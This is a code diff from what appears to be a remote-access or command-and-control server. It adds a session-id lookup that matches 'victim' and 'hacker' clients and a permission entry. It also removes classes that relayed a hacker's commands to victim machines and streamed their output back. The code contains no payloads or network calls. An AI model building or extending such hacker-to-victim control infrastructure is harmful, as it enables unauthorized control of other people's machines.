@@ -244,6 +244,19 @@ class Sessions:
 
         return self._sessions[session_id]
 
+    def get_session_id(self, client_id: str):
+        """Get the session id using the client_id"""
+        if not self.check_client_in_session(client_id):
+            return None
+
+        session_id = [
+            session_id
+            for session_id, session in self._sessions.items()
+            if session["victim_id"] == client_id or session["hacker_id"] == client_id
+        ][0]
+
+        return session_id
+
     def check_session_active(self, session_id: str):
         """Check if the given session exists and is active."""
         return True if self._sessions.get(session_id, None) is not None else False
@@ -267,64 +280,6 @@ class HandlerResponse:
         self.res_code = res_code
         self.body = body
         self.headers = headers
-
-
-# class Client:
-#     """The client, i.e victim, server and probably Admin.
-#     Make sure to check the validity of the headers before passing it to the client."""
-
-#     def __init__(self, headers: HTTPMessage, database_handler: Database):
-#         # ---- Making the arguments we get instance wide
-#         self.headers = headers
-#         self.db_handler = database_handler
-
-#         # ---- Setting the client's properties
-#         self.client_type = self.get_client_type()
-
-#     def get_client_type(self):
-#         """Get the client type from the headers and database."""
-#         # This property must exist if it doesn't then we're in trouble
-#         # I said it must exist because we should have already checked the
-#         # authenticity of the request before passing the header to the client.
-#         client_id = self.headers["client-id"]
-
-#         # Check if the user is already in the database
-#         client_type = self.db_handler.query("SELECT client_type FROM clients WHERE client_id=?", (client_id,))
-
-#         if client_type is None:
-#             # Some error occurred so let's report it to the user
-#             raise Exception(f"SQL execution failure while getting the client type of client '{client_id}'")
-
-#         if len(client_type) == 0:
-#             # No client existed with this ID so this must be a new one.
-
-
-#         else:
-#             # The client exists in the database so we'll use that to verify
-#             # the authenticity of the request
-#             pass
-
-
-class LiveSessionData:
-    def __init__(self):
-        # A map of a victim with it's hacker that are in a live session
-        # used to prevent multiple hackers hacking the same machine at once.
-        self.hacking_sessions: dict[str, str] = {
-            # victim_id: hacker_id
-        }
-
-        # A live map of the hackers with their commands they send
-        # and responses they receive.
-        self.hacker_victim_communication: dict[
-            str, dict[Literal["command", "response"], list[str] | str]
-        ] = {
-            # hacker_id: {
-            # command: "current_cmd_set_by_hacker",
-            # response: [] # Responses are lists instead of strings because a the responses are streams of outputs
-            # and also it helps the hacker not to miss something so rather than
-            #  overwriting the key like a string the server will append it on the list.
-            # }
-        }
 
 
 class Config:
@@ -367,6 +322,7 @@ class Config:
                 ut.ClientType.hacker,
                 ut.ClientType.admin,
             ],
+            ut.ServerCommands.get_session: [ut.ClientType.victim, ut.ClientType.admin],
         }
 
         self.server_cmds = {
